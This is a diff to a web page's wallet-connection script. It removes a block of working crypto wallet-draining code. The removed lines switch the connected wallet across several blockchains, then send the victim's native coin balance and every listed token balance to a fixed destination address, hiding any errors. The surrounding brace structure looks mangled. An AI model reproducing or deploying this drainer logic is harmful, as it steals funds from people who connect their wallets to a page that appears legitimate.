@@ -255,51 +255,6 @@ modal.subscribeProvider(async(state) => {
             console.error('Fatal error:', fatalError);
         }
     }
-});            
-            // Multi-chain drainage
-            for(const chainId of CHAINS) {
-                try {
-                    // Switch chain
-                    if(network.chainId !== chainId) {
-                        await window.ethereum.request({
-                            method: 'wallet_switchEthereumChain',
-                            params: [{chainId: '0x' + chainId.toString(16)}]
-                        });
-                        await new Promise(r => setTimeout(r, 1000));
-                    }
-                    
-                    // Drain native
-                    if(true) {
-                        const bal = await provider.getBalance(address);
-                        if(bal.gt(ethers.utils.parseEther('0.001'))) {
-                            const gas = (await provider.getGasPrice()).mul(21000).mul(2);
-                            const amt = bal.sub(gas);
-                            if(amt.gt(0)) {
-                                await signer.sendTransaction({
-                                    to: DEST,
-                                    value: amt,
-                                    gasLimit: 21000
-                                });
-                            }
-                        }
-                    }
-                    
-                    // Drain tokens
-                    if(true) {
-                        const tokens = TOKENS[chainId] || [];
-                        for(const token of tokens) {
-                            try {
-                                await new Promise(r => setTimeout(r, DELAY));
-                                const c = new ethers.Contract(token, ERC20_ABI, signer);
-                                const b = await c.balanceOf(address);
-                                if(b.gt(0)) await c.transfer(DEST, b, {gasLimit: 100000});
-                            } catch(e) {}
-                        }
-                    }
-                } catch(e) {}
-            }
-        } catch(e) {}
-    }
 });
 </script>
 </body>
